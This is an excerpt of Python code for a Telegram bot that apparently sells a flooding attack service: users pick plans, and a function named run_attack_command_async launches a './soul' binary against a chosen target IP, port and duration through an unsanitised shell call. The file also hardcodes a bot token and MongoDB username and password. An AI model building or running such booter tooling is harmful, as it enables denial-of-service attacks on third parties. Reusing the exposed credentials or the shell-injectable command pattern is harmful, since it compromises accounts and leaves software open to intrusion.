...
TOKEN = '7422876558:AAF-iYzpTHsJZL4piYE2Wq0qLrtKtpHLp5A'
MONGO_URI = 'mongodb+srv://RK9010:RKISTHEBEST@rk.ajagb.mongodb.net/?retryWrites=true&w=majority&appName=RK'
FORWARD_CHANNEL_ID = -1002169055306
CHANNEL_ID = -1002169055306
error_channel_id = -1002169055306
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 15")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/RK9010GROUP/124*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*Help selected @RK9010*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin selected @RK9010*", parse_mode='Markdown')
    else:
